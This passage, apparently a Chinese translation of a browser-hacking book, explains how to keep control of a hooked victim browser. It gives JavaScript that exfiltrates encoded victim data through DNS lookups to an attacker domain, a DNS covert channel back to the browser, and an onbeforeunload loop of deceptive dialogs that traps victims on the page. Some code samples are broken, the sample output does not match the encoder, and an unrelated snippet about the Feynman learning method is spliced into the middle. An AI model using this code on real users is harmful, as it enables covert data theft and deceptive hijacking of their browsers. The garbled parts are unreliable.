
### Figure 3-5: `window.postMessage()` 支持情况在常见浏览器中的表现

![c03f005.tif](img/c03f005.png)

end figure

Internet Explorer 版本 8 到 10 只能部分支持 `postMessage()`，而 `WebSocket` 协议是完全受支持的（参见注 9）。这也是您可能希望将 `postMessage()` 设为主要通信通道的原因（前提是被钩浏览器不是 Internet Explorer）。

## 使用 DNS 隧道通信

如前所述，所有讨论过的通信通道均依赖 HTTP 协议。`WebSocket` 协议是例外，但其初始握手仍然依赖于一个被 HTTP 服务器解释为 Upgrade 请求的 HTTP 请求，例如：

```
GET /ws HTTP/1.1
Host: browserhacker.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://browservictim.com
Sec-WebSocket-Version: 13
```

除非您正在针对没有直接连接的浏览器（例如位于 HTTP 代理后面、会记录并可能检查内容的浏览器），否则这里没有问题。这时，基于 DNS 的通信通道可能会派上用场，并结合其他规避技术，以降低被检测的可能性。只有少数安全解决方案监控 DNS 请求，11 而且它们的效果往往受到质疑，因为大多数现代浏览器使用 DNS prefetching（DNS 预取）来提升加载未来资源的响应速度。

Kenton Born 在 2010 年的 BlackHat 会议上发表了研究 12，展示了如何利用浏览器自身的 DNS covert channel。该方法在单向数据从浏览器到服务器的场景下非常有效，但如果通信需要双向进行，则实现会更加复杂。

- 你可以创建一个基于 DNS 的单向数据泄漏通道，发送请求到精心构造的域名，这些域名由你受控的 DNS 服务器解析。该通道可以用于向客户端传递对称密钥，以便在随后的 HTTP 请求和响应中加密客户端与服务器之间交换的数据。例如，如果你想通过这种技术发送字符串 “ABCDE”，可以将其编码后作为子域名解析请求提交。如果你的 DNS 服务器解析 `browserhacker.com`，你只需请求一个图像资源即可发送数据负载，例如 `<img src="_encodedData_.browserhacker.com">`。生成 `_encodedData_` 的简单 JavaScript 函数可能如下：

```
encode_data = function(str) {
  var result="";
  for(i=0;i<str.length;++i) {
    result+=str.charCodeAt(i).toString(16).toUpperCase();
  }
  return result;
};

var data = "data_to_extrude_from_client_to_server";
var _encodedData_ = encodeURI(encode_data(data));
console.log(_encodedData_);
```

上述代码之所以需要，是因为域名只能包含字母数字字符以及连字符（-）和点（.）. `encode_data()` 的结果（使用前面示例中的 `data`）为：

```
646174615F746F657874727564655F66726F6D5F636C69656E745F746F5F736572766572
```

需要考虑的另一个限制是 FQDN（完全限定域名）长度限制为 255 个字符（包括点）。基于这些限制，前面的代码片段可以通过以下方式扩展：

```
var max_domain_length = 255;
var max_segment_length = max_domain_length - 
  "browserhacker.com".length;
var dom = document.createElement('b');

// 将字符串分割成块
String.prototype.chunk = function(n) {
  if (typeof n=='undefined') n=100;
  return this.match(RegExp('.{1,'+n+'}','g'));
};

// 发送 DNS 查询
sendQuery = function(query) {
  var img = new Image;
  img.src = "http://"+query;
  img.onload = function() { dom.removeChild(this); }
  img.onerror = function() { dom.removeChild(this); }
  dom.appendChild(img);
};

// 将消息分割成段
segments = _encodedData_.chunk(max_segment_length);
for (seq=1; seq<=segments.length; seq++) {
  // 发送段
  sendQuery(seq+"."+segments.length+"." + 
    segments[seq-1]+".browserhacker.com");
}
```

根据你使用的攻击域名长度以及前面讨论的 FQDN 限制，前面的代码片段负责将编码数据分割成类似下面的块：

```
.EA.A9.8F.EA.A9.8C.EA.A9.8D.EA.A9.8A.EA.A9.8B
```

由于数据负载可能远大于仅五个字符的简单字符串，它首先会被分割成块。对每个块，会在 DOM 中添加对应的 `<img>` 元素。使用 `<img>` 标签是因为，当浏览器禁用 DNS 预取时，`src` 属性会先触发 DNS 解析，从而产生 DNS 查询；而加载图像的 HTTP 请求则会在稍后发出。需要注意的是，如果 DNS 服务器返回错误或 “未找到”，随后的 HTTP 请求将永远不会发送。与此同时，DNS 服务器已经处理了客户端发来的数据，这有助于实现更隐蔽的通信。

如果你想实现双向通信，即从服务器向客户端发送数据，则更为困难，但仍然可行。

实现双向通信的一种方法是推断 DNS 查询的时间（即域名解析需要的时间），也就是说根据解析时长来判断服务器想要传输的位值。例如，你可以推断如果域名在不到一秒内解析，服务器想要传输 0；如果解析时间超过一秒，则想要传输 1。通过这种方式，浏览器可以根据二进制表示重构字符串，最终使用 `String.fromCharCode()` 来生成实际字符。

更快的方法是利用成功和失败的连接来表示每一位数据。也就是说，一个域名对应一位数据。通过 JavaScript 可以检测到解析错误，从而确定位的状态。

在下面的示例（如 Figure 3-6 所示），域名 `bit-00000002-0000003d.browserhacker.com` 根据是否能解析返回 1 或 0。

start figure

**Figure 3-6:** 解析域名

![c03f006.eps](img/c03f006.png)

end figure

在 Figure 3-6 中，查询了两个不同的域名，为了突出差异，箭头指向每个请求中细微不同的字符。一个域名能解析，另一个不能。这就是 DNS 隧道中位状态检测的基础。在此例中，当位被设为 true 时，会返回 IP 地址 `74.125.237.136`。其原因在本节后面说明，并在 Figures 3-7 和 3-8 中展示。

start figure

**Figure 3-7:** 返回 1 位

![c03f007.eps](img/c03f007.png)

end figure

Figure 3-7 展示了通过 DNS 隧道返回 1 位的过程。图像成功加载（跨域）后，`onload` 函数被调用，用于标记位的 true 状态。

start figure

**Figure 3-8:** 返回 0 位

![c03f008.eps](img/c03f008.png)

end figure

Figure 3-8 展示了通过 DNS 隧道传输信息的过程，但这一次传输的是 0 位。图像加载失败（域名不存在），`onerror` 函数被调用，用于标记位的 0 状态。

二进制传输过程会与浏览器通信到你控制的 DNS 服务器，告诉它应该返回哪个 IP 地址以表示 true 状态。随后，服务器可以通过该隧道向浏览器传输数据。

下面的代码示例演示如何从 DNS 隧道中获取字符串（获取 IP 地址的步骤已被省略以简化演示）。IP 地址 `74.125.237.136` 已硬编码在 DNS 隧道服务器中。

```
// 从 DNS 隧道获取字符串（IP 地址已硬编码）
var targetIP = "74.125.237.136";

function resolveAndGetChar(domain) {
  var img = new Image();
  img.src = "http://" + domain + "." + targetIP;
  img.onload = function() {
    // 成功加载 → 1
    return 1;
  };
  img.onerror = function() {
    // 加载失败 → 0
    return 0;
  };
  // 触发 DNS 查找
  img.load();
  // 简单轮询等待回调
  var start = Date.now();
  while (Date.now() - start < 2000) {
    // 最多等待 2 秒
    if (img.complete) break;
  }
  return img.complete ? (img.onload ? 1 : 0) : -1; // -1 = 仍在等待
}

// 示例用法：获取域名 "truebit" 所代表的位值
var domain = "truebit";
var bitValue = resolveAndGetChar(domain); // 1 或 0
console.log("Bit value:", bitValue);
```

- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。

1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。

```
if (condVar > someVal) {console.log("xxx")}
```

- 使用浏览器事件

你是否见过网站在关闭前要求确认的情况？这种行为在某些网站上会非常烦人，尤其是当网站每次点击“确定”后仍然弹出相同的确认框时。

这正是你可以让受控目标在特定页面上停留更长时间的方法。在某些情况下，停留在钩钓页面几秒钟可以让更多的命令模块被执行。记住，停留时间越长，越好。

该技术依赖于处理 `window` 对象的 `onbeforeunload` 事件，默认触发条件包括：

* 当 `unload` 事件发生时 — — 你关闭了当前标签页、整个浏览器，或简单地离开页面
* 当调用 `window.close` 或 `document.close` 时
* 当调用 `location.replace` 或 `location.reload` 时

以下是一个在所有桌面浏览器（Opera 12 之前除外）中均可工作的基本实现：

```javascript
function display_confirm(){
  if(confirm("Are you sure you want to navigate away from this  
    page?\n\n There is currently a request to the server pending.  
    You will lose recent changes by navigating away.\n\n Press OK   
    to continue, or Cancel to stay on the current page.")){
    display_confirm();
  }
}

function dontleave(e){
  e = e || window.event;

  // 如果是 Internet Explorer，语法略有不同
  if(browser.isIE()){
    e.cancelBubble = true;
    e.returnValue = "There is currently a request to the server 
      pending. You will lose recent changes by navigating away.";
  }else{
    if (e.stopPropagation) {
      e.stopPropagation();
      e.preventDefault();
      e.returnValue = "There is currently a request to the server   
        pending. You will lose recent changes by navigating away.";
    }
  }

  // 重新显示确认框，让用户点击“确定”时感到烦扰
  display_confirm();
  return "There is currently a request to the server pending. You  
    will lose recent changes by navigating away.";
}

window.onbeforeunload = dontleave;
```

该示例会覆盖已有的 `onbeforeunload` 处理函数并执行 `dontleave` 函数。为进一步防止冲突，使用 `cancelBubble` 方法在 Internet Explorer 中阻止事件冒泡，从而阻止已有函数干扰新代码。根据现有 JavaScript 代码的复杂程度，阻止事件冒泡也是提升性能的好办法。如果有许多嵌套元素，直接覆盖原有代码并阻止冒泡可能是个不错的选择。

浏览器间的行为略有差异。如图 3-10 和 3-11 所示，Firefox 18 的表现如下：如果受害者点击“取消”，第二个确认框会自动弹出；如果点击“确定”，确认框会在循环中不断重复显示。唯一真正离开页面的操作是点击“离开页面”，如图 3-11 所示。

start figure

**Figure 3-10:** First dialog on Firefox 18 with custom content (controlled with JavaScript)

![c03f010.tif](img/c03f010.png)

end figure

start figure

**Figure 3-11:** Second dialog on Firefox 18 (can’t be controlled with JavaScript)

![c03f011.tif](img/c03f011.png)

end figure

在 Internet Explorer 9（Windows 7）上的行为非常相似，但你可以对对话框文本拥有更多控制，如图 3-12 和 3-13 所示。Figure 3-13 中的第二个对话框文本也可以自定义。总体行为与 Firefox 相同。

start figure

**Figure 3-12:** First dialog box on IE 9 with custom content (controlled with JavaScript)

![c03f012.tif](img/c03f012.png)

end figure

start figure

**Figure 3-13:** Second dialog box on IE 9 (controlled with JavaScript)

![c03f013.tif](img/c03f013.png)

end figure

因此，你可能只想在 Internet Explorer 浏览器上使用此关闭技术，因为 Firefox 和 Chrome 在自定义消息方面的功能受限。

作为保持持久性的方法，使用这些事件可能为你提供几秒钟的执行时间，但它们并不是理想的长期控制手段。弹出下方窗口（pop-under window）将在下一节中讨论，可能为你提供保留对被钩浏览器控制的新机会。当然，你也可以组合多种技术，通过层叠自定义关闭事件处理例程；使用 IFrames 和弹出下方窗口，你可能会在完成所需命令前保持钩钓时间足够长。

## 使用弹出下方窗口

当你浏览到某个网站时，最让人恼火的莫过于无提示的弹窗。你有多少次被迫反复关闭多个显示广告的弹窗？而弹窗是指在当前浏览器页面前景出现的新浏览器窗口，而弹下（pop-under）则是一个在背景出现的新浏览器窗口，字面上说它位于当前浏览器窗口的下方。大多数现代浏览器默认会阻止弹下的行为。
